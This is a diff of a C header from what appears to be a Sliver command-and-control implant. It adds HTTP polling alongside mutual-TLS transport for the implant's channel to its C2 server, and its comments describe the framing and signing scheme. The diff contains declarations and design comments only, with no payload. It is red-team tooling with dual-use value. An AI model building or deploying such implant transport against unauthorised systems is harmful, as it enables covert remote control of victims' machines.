@@ -54,13 +54,29 @@ struct sliver_channel {
   void *state;
 };
 
-/* Establishes a channel using the injected material. Picks the implementation
- * from the C2 URL scheme (only mtls is implemented today). On success *out is
- * set and 0 returned; otherwise -1 with a printable reason in err. */
-int sliver_channel_dial(const char *host, uint16_t port, const char *ca_pem,
-                        const char *cert_pem, const char *key_pem,
+/* Establishes a channel for the given C2 URL. The scheme selects the
+ * implementation:
+ *   mtls://  STREAM  TLS1.3 mTLS + "MUX/1" + yamux + signed frame
+ *   http://  POLL    HTTP/1.1 POST, one framed envelope per request/response
+ *   https:// POLL    reserved (not implemented yet: reports an error)
+ * On success *out is set and 0 returned; otherwise -1 with a printable reason.
+ *
+ * POLL channels keep the scheduler unchanged: send() performs the round trip and
+ * queues any reply envelope, recv() pops it (or performs an empty poll). */
+int sliver_channel_dial(const char *c2_url, const char *host, uint16_t port,
+                        const char *ca_pem, const char *cert_pem, const char *key_pem,
                         const char *age_private_key, const char *server_minisign_pubkey,
                         sliver_channel_t **out, char *err, size_t err_len);
+
+/* Implementations, called by sliver_channel_dial (src/transport/channel.c). */
+int sliver_channel_mtls_dial(const char *host, uint16_t port, const char *ca_pem,
+                             const char *cert_pem, const char *key_pem,
+                             const char *age_private_key,
+                             const char *server_minisign_pubkey, sliver_channel_t **out,
+                             char *err, size_t err_len);
+int sliver_channel_http_dial(const char *c2_url, const char *age_private_key,
+                             const char *server_minisign_pubkey, sliver_channel_t **out,
+                             char *err, size_t err_len);
 
 /* Closes and frees a channel returned by sliver_channel_dial. */
 void sliver_channel_free(sliver_channel_t *c);
